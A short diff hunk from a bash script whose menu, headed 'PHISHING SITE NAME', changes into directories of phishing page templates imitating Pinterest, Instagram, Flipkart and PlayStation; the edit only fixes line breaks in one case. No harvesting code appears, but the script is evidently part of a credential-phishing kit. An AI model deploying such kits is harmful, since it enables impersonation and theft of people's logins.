@@ -122,7 +122,8 @@ echo -e  "\e[91m........................\e[92mPHISHING SITE NAME\e[91m..........
  cd pinterest;;
          4) cd WebPages1
  cd Instagram_VerifiedBadge ;;
-      5) cd WebPages1   cd flipkart;;
+      5) cd WebPages1 
+  cd flipkart;;
            6) cd WebPages1
             cd playstation;;
            7) cd WebPages1
